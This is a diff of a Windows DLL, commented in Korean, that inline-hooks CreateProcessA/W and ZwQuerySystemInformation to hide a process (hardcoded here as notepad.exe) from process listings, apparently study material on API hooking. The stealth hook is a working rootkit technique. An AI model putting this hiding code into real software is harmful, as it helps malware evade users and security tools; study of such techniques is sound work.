@@ -73,12 +73,6 @@ typedef BOOL(WINAPI *PFCREATEPROCESSW)(
 	LPPROCESS_INFORMATION lpProcessInformation
 	);
 
-// global variable (in sharing memory)
-#pragma comment(linker, "/SECTION:.SHARE,RWS")
-#pragma data_seg(".SHARE")
-	char g_szProcName[MAX_PATH] = { 0, };
-#pragma data_seg()
-
 // global variable
 BYTE g_pOrgCPA[5] = { 0, };
 BYTE g_pOrgCPW[5] = { 0, };
@@ -139,21 +133,34 @@ BOOL hook_by_code(
 	PROC pfnNew, 
 	PBYTE pOrgBytes)
 {
-	FARPROC pfnOrg;
+	FARPROC pfnOrg = NULL;
 	DWORD dwOldProtect, dwAddress;
 	BYTE pBuf[5] = { 0xE9, 0, };
-	PBYTE pByte;
+	PBYTE pByte = nullptr;
 
 	// 후킹 대상 API 주소를 구한다
 	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
+	if (pfnOrg == NULL)
+	{
+		OutputDebugString(_T("GetProcAddress failed"));
+		return FALSE;
+	}
+
 	pByte = (PBYTE)pfnOrg;
 
 	// 만약 이미 후킹 되어 있다면 return FALSE
 	if (pByte[0] == 0xE9)
+	{
+		OutputDebugString(_T("Already Hooked"));
 		return FALSE;
+	}
 
 	// 5 byte 패치를 위하여 메모리에 WRITE 속성 추가
-	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+	if (TRUE != VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+	{
+		OutputDebugString(_T("VirtualProtect failed"));
+		return FALSE;
+	}
 
 	// 기존 코드 (5 byte) 백업
 	memcpy(pOrgBytes, pfnOrg, 5);
@@ -167,7 +174,11 @@ BOOL hook_by_code(
 	memcpy(pfnOrg, pBuf, 5);
 
 	// 메모리 속성 복원
-	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);
+	if (TRUE != VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect))
+	{
+		OutputDebugString(_T("VirtualProtect failed"));
+		return FALSE;
+	}
 
 	return TRUE;
 }
@@ -178,20 +189,32 @@ BOOL unhook_by_code(
 	const char* szFuncName, 
 	PBYTE pOrgBytes)
 {
-	FARPROC pFunc;
+	FARPROC pFunc = NULL;
 	DWORD dwOldProtect;
 
 	// API 주소 구한다
 	pFunc = GetProcAddress(GetModuleHandle(szDllName), szFuncName);
+	if (pFunc == NULL)
+	{
+		OutputDebugString(_T("GetProcAddress failed"));
+		return FALSE;
+	}
 
 	// 원래 코드(5 byte)를 덮어쓰기 위해 메모리에 WRITE 속성 추가
-	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);
-
+	if(TRUE != VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect))
+	{
+		OutputDebugString(_T("VirtualProtect failed"));
+		return FALSE;
+	}
 	// Unhook
 	memcpy(pFunc, pOrgBytes, 5);
 
 	// 메모리 속성 복원
-	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);
+	if (TRUE != VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect))
+	{
+		OutputDebugString(_T("VirtualProtect failed"));
+		return FALSE;
+	}
 
 	return TRUE;
 }
@@ -262,7 +285,7 @@ NTSTATUS WINAPI NewZwQuerySystemInformation(
 			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1], -1,
 								szProcName, MAX_PATH, NULL, NULL);
 
-			if (!_strcmpi(szProcName, g_szProcName))
+			if (!_strcmpi(szProcName, "notepad.exe"))
 			{
 				if (pCur->NextEntryOffset == 0)
 					pPrev->NextEntryOffset = 0;
@@ -272,7 +295,7 @@ NTSTATUS WINAPI NewZwQuerySystemInformation(
 			else
 				pPrev = pCur;	// 원하는 프로세스를 못 찾은 경우만 pPrev 세팅
 
-			if (pCur->NextEntryOffset == 0)
+ 			if (pCur->NextEntryOffset == 0)
 				break;
 
 			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
@@ -438,25 +461,40 @@ APIENTRY DllMain(HMODULE hModule,
 				 LPVOID lpReserved
 )
 {
-	SetPrivilege(SE_DEBUG_NAME, true);
+	OutputDebugString(_T("DllMain Init.\n"));
 
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		hook_by_code(_T("kernel32.dll"), 
+		if( TRUE != hook_by_code(_T("kernel32.dll"), 
 					 "CreateProcessA",
 					 (PROC)NewCreateProcessA, 
-					 g_pOrgCPA);
+					 g_pOrgCPA))
+		{
+			OutputDebugString(_T("CreateProcessA Hooking Failed."));
+			return FALSE;
+		}
+		OutputDebugString(_T("CreateProcessA Hooking SUCCESS."));
 
-		hook_by_code(_T("kernel32.dll"), 
-					 "CreateProcessW",
-					 (PROC)NewCreateProcessW, 
-					 g_pOrgCPW);
+		if (TRUE != hook_by_code(_T("kernel32.dll"),
+								 "CreateProcessW",
+								 (PROC)NewCreateProcessW,
+								 g_pOrgCPW))
+		{
+			OutputDebugString(_T("CreateProcessW Hooking Failed."));
+			return FALSE;
+		}
+		OutputDebugString(_T("CreateProcessW Hooking SUCCESS."));
 
-		hook_by_code(_T("ntdll.dll"), 
-					 "ZwQuerySystemInformation",
-					 (PROC)NewZwQuerySystemInformation, 
-					 g_pOrgZwQSI);
+		if (TRUE != hook_by_code(_T("ntdll.dll"),
+								 "ZwQuerySystemInformation",
+								 (PROC)NewZwQuerySystemInformation,
+								 g_pOrgZwQSI))
+		{
+			OutputDebugString(_T("ZwQuerySystemInformation Hooking Failed."));
+			return FALSE;
+		}
+		OutputDebugString(_T("ZwQuerySystemInformation Hooking SUCCESS."));
 		break;
     case DLL_PROCESS_DETACH:
 		unhook_by_code(_T("kernel32.dll"), 
@@ -473,14 +511,3 @@ APIENTRY DllMain(HMODULE hModule,
     }
     return TRUE;
 }
-
-#ifdef __cplusplus
-extern "C" {
-#endif
-	__declspec(dllexport) void SetProcName(const char* szProcName)
-	{
-		strcpy_s(g_szProcName, _countof(g_szProcName),szProcName);
-	}
-#ifdef __cplusplus
-}
-#endif
